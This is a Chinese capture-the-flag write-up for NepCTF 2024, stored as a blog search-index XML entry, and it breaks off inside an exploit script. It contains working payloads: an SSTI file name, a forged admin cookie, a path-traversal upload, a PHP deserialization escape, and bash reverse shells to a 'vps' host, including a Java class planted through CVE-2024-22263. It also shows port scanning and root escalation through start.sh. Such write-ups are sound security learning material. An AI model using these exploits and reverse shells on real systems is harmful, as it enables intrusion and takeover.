<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024NepCTF</title>
    <link href="/2024/08/26/2024NepCTF/"/>
    <url>/2024/08/26/2024NepCTF/</url>
    
    <content type="html"><![CDATA[<p>没错，冲着贴纸来的！</p><img src="/2024/08/26/2024NepCTF/1.jpg" class=""><h1 id="nepmagic-checkin"><a class="markdownIt-Anchor" href="#nepmagic-checkin"></a> NepMagic —— CheckIn</h1><p>集齐所有碎片通过就o了</p><p>NepCTF{50c505f4-2700-11ef-ad49-00155d5e2505}</p><h1 id="nepdouble"><a class="markdownIt-Anchor" href="#nepdouble"></a> NepDouble</h1><img src="/2024/08/26/2024NepCTF/2.jpg" class=""><p>这里明显存在SSTI，而且文件名可控</p><p>创建一个名为</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__init__.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read().py</span><br></code></pre></td></tr></table></figure><p>的文件，然后压缩成zip上传</p><img src="/2024/08/26/2024NepCTF/3.jpg" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;https://neptune-55198.nepctf.lemonprefect.cn/&quot;</span><br>file=&#123;<span class="hljs-string">&quot;tp_file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:/CTFtmp/test.zip&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)&#125;<br>r=requests.post(url=url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-comment">#&lt;a href=&quot;/cat?file=f35a84497a3683d7a0f11aa112ed07fc/NepCTF&#123;89cf3517-065a-45f3-b9e9-3b8e2721d22b&#125;.py&quot;&gt;flag&#x27;).read()&#125;&#125;.py&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><h1 id="蹦蹦炸弹boom_it"><a class="markdownIt-Anchor" href="#蹦蹦炸弹boom_it"></a> 蹦蹦炸弹（boom_it）</h1><img src="/2024/08/26/2024NepCTF/4.jpg" class=""><p>secret_key已经知道，可以伪造admin</p><img src="/2024/08/26/2024NepCTF/5.jpg" class=""><p>改一下然后本地启动，得到admin的cookie</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">session</span><span class="hljs-operator">=</span>eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br></code></pre></td></tr></table></figure><p>用这个cookie访问admin/dashboard，上传文件lock.txt</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/admin/</span>dashboard HTTP/<span class="hljs-number">1.1</span><br>Host: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br>Sec-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br>Sec-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/102.0.5005.63 Safari/</span><span class="hljs-number">537.36</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>Sec-Fetch-Site: none<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?<span class="hljs-number">1</span><br>Sec-Fetch-Dest: document<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Connection: close<br>Cookie:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Length: <span class="hljs-number">198</span><br><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>;filename=<span class="hljs-string">&quot;../../lock.txt&quot;</span><br>Content-Type:multipart/form-data<br><br><span class="hljs-number">111</span><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS--<br><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin/dashboard?cmd=bash+-c+&#x27;bash+-i+&gt;%<span class="hljs-number">26</span>+/dev/tcp/vps/port+&lt;%<span class="hljs-number">261</span>&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">102</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5005</span>.<span class="hljs-number">63</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br><span class="hljs-attribute">Connection</span>: close<br><br><br></code></pre></td></tr></table></figure><p>有个pwn文件，传fascan上去扫一下开放的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 11451 &lt;fscan<br><br>nc vps 11451 &gt;fscan<br><span class="hljs-built_in">chmod</span> +x fscan<br>./fscan -h 127.0.0.1<br></code></pre></td></tr></table></figure><p>可以发现内网的8888端口是开放的</p><p>nc一下发现是start.sh在运行，而且start.sh是root用户的，那起的服务也就具有root权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;chmod 0777 /home/ctfuser/flag*&quot;</span> &gt;&gt;start.sh<br><span class="hljs-attribute">nc</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>flag就有权限了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>ctfuser/flag*<br></code></pre></td></tr></table></figure><p>NepCTF{197b7e20-0bb8-47a1-a431-82a2c18ed9ae}</p><h1 id="php_master"><a class="markdownIt-Anchor" href="#php_master"></a> PHP_MASTER!!</h1><p>要构造的调用链C::__destruct–&gt;B::__tostring–&gt;phpinfo</p><p>要执行($this-&gt;b) ()就要绕过过滤</p><p>由于mb_substr(data,start,end)，当end为负数时是从后往前数，所以构造<code>nep=1&amp;nep1=]              [NepCTF]</code>进行绕过</p><p>因为使用<code>$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>进行替换，所以是反序列化变长逃逸，由于只能控制C-&gt;s;</p><p>因为echo是str，所以需要使C-&gt;str是B，所以构造<code>s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;</code></p><p>把这个放到C,最后要使得序列化C之后要得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:?:<span class="hljs-string">&quot;填充\0&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>?和\0的个数是我们要计算的，而通过c传递的值为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">填充\<span class="hljs-number">0</span><span class="hljs-string">&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">b&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;;&#125;</span><br></code></pre></td></tr></table></figure><p>如果不填充？的值就是<code>&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度</p><p>每填充一个\0经过替换后就会逃逸右边一个符号，总共需要逃逸<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度为49</p><p>所以？的值就是输入c的长度，即<code>49个\0&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度，为108</p><p>通过url编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%4</span>f<span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%42</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%62</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%37</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d&amp;nep<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;nep<span class="hljs-number">1</span><span class="hljs-operator">=</span>]              [NepCTF]<br></code></pre></td></tr></table></figure><p>序列化后变成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:<span class="hljs-number">108</span>:<span class="hljs-string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>nepctf{fc8b21346275}</p><h1 id="always-rce-first"><a class="markdownIt-Anchor" href="#always-rce-first"></a> Always RCE First</h1><p>访问<a href="https://neptune-46711.nepctf.lemonprefect.cn/api/about">https://neptune-46711.nepctf.lemonprefect.cn/api/about</a></p><img src="/2024/08/26/2024NepCTF/6.jpg" class=""><p>用的Spring Cloud Skipper Server版本是2.11.2，google搜一下发现这个版本存在CVE可以在任意位置写文件</p><p><a href="https://github.com/securelayer7/CVE-2024-22263_Scanner">https://github.com/securelayer7/CVE-2024-22263_Scanner</a></p><p><a href="https://yyjccc.github.io/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/">https://yyjccc.github.io/2024/07/12/springcloud-dataflow任意文件写入（CVE-2024-22263）/</a></p><img src="/2024/08/26/2024NepCTF/7.jpg" class=""><p>Dockerfile 里面用的是jdk8</p><p>搜一下发现spring-boot jdk8存在从文件上传到RCE的利用方法</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p><p><a href="https://forum.butian.net/share/1623">https://forum.butian.net/share/1623</a></p><p>把里面的IBM33722改成反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> sun.nio.cs.ext;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IBM33722</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IBM33722</span><span class="hljs-params">()</span> &#123;<br>        fun();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;String, String&gt; <span class="hljs-title function_">fun</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>        String[] var0;<br>        <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Mac OS&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Windows&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(var0);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>            var4.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        fun();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后打包成charsets.jar,再压缩成charsets.zip,再通过CVE-2024-22263上传，脚本要小修一下，本地搭了docker调才发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logo</span>():<br>    logo = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ </span><br><span class="hljs-string">██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗╚════██╗╚════██╗██╔════╝ ╚════██╗</span><br><span class="hljs-string">██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝ █████╔╝ █████╔╝███████╗  █████╔╝</span><br><span class="hljs-string">██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══██╗ ╚═══██╗</span><br><span class="hljs-string">╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗███████╗███████╗╚██████╔╝██████╔╝</span><br><span class="hljs-string"> ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ </span><br><span class="hljs-string">                                                                                                             </span><br><span class="hljs-string">                                        By: SecureLayer7 (Zeyad Azima)</span><br><span class="hljs-string">                            https://github.com/securelayer7/CVE-2024-22263_Scanner</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(logo)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createPocFile</span>(<span class="hljs-params">target, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">f&quot;Target: <span class="hljs-subst">&#123;target&#125;</span>\nPort: <span class="hljs-subst">&#123;port&#125;</span>\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file created successfully.&quot;</span>)<br>    <span 